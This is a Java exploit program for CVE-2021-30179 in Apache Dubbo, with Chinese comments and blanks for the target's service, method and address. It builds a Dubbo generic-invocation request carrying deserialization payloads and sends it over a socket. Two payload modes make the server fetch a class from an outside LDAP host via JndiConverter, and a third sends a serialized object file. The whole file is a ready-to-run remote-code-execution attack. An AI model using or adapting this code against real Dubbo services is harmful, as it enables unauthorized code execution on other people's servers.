package cve;

import util.FileUtil;
import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;


import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

/**
 * 漏洞编号:
 *      CVE-2021-30179
 * 适用版本:
 *      Apache Dubbo 2.7.0 to 2.7.9
 *      Apache Dubbo 2.6.0 to 2.6.9
 *      Apache Dubbo all 2.5.x versions
 */
public class CVE_2021_30179 {
    public static void main(String[] args) throws Exception{

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // set body
        out.writeUTF("2.7.6");//dubbo版本
        //todo 此处填写Dubbo提供的服务名
        out.writeUTF("com.example.api.DemoService");//接口全限定名
        out.writeUTF("");//接口版本
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        //todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");//接口的方法
        out.writeObject(new String[] {"java.lang.String"});//接口方法的参数类型

        // POC 1: raw.return
        getRawReturnPayload(out, "ldap://10.41.230.66:1389/uqsh9k");

        // POC 2: bean
//        getBeanPayload(out, "ldap://192.168.26.164:1389/amu6em");

        // POC 3: nativejava
//        getNativeJavaPayload(out, System.getProperty("user.dir")+ "\\CVE-2021-30179\\src\\main\\resources\\calc.ser");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("10.41.230.66", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap map = new HashMap();

        map.put("generic", "bean");
        out.writeObject(map);
    }

    private static void getNativeJavaPayload(Hessian2ObjectOutput out, String serPath) throws IOException {
        byte[] payload = FileUtil.getBytesByFile(serPath);
        System.out.println(payload.toString());
        out.writeObject(new Object[] {payload});

        HashMap map = new HashMap();
        map.put("generic", "nativejava");
        out.writeObject(map);
    }
}
